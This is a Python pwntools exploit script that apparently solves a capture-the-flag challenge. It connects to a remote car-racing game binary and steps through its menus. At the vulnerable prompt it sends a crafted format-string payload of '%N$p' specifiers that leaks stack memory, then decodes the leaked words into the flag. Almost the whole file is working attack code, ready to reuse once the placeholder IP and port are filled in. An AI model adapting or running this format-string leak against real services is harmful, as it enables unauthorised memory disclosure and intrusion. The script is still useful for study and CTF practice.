#!/usr/bin/python3

# Use pwn library
from pwn import *

# FILE* variable is at @+12 from car_menu
fd_pointer = 12

# Flag fits in 11 uint32_t's (44 bytes divided by 4 bytes, which is a uint32_t = 11)
char_array = fd_pointer + 11

# Payload to be fed to the program
payload = ""

# Craft the payload
for i in range(fd_pointer, char_array):
    # This crafts a precise payload containing %p format string modifiers
    payload += "%" + str(i) + "$p "

# Main function
def launch():
    print("[" '\033[94m' "*" '\033[0m' "] Launching the exploit...")
    # IP has to be changed
    binary = remote("IP", PORT)
    # Send information until we reach the vulnerable part
    binary.sendlineafter(b'Name', b'0xCAFEBABE')
    binary.sendlineafter(b'Nickname', b'0xC0DEBABE')
    binary.sendlineafter(b'selection', b'2')
    binary.sendlineafter(b'car', b'2')
    binary.sendlineafter(b'Circuit', b'1')
    # Inject the payload, encode it as utf-8 byte array to avoid pwn lib warnings
    binary.sendlineafter(b'victory?', payload.encode("utf-8"))
    # Recieve information
    binary.recv()
    # Assign the result of the server answer to a variable
    binary_answer = binary.recv()

    # Leave only hex values in the 'soup'
    byte_soup = (binary_answer.decode("utf-8").split("m\n"))[1]

    # Separate each hexadecimal value into it's own val.
    byte_soup = byte_soup.split()

    # Flag to be obtained
    flag = ""

    # For each hexadecimal value    
    for hexdecimal in byte_soup:
        # Conver the value to big-endian and store each 44 chars to the flag variable
        flag += p32(int(hexdecimal, base=16)).decode("utf-8")

    # Print the flag
    print("[" '\033[92m' "âœ“" '\033[0m' "]", flag[:-1])

# Default target is launch()
if __name__ == "__main__":
    launch()
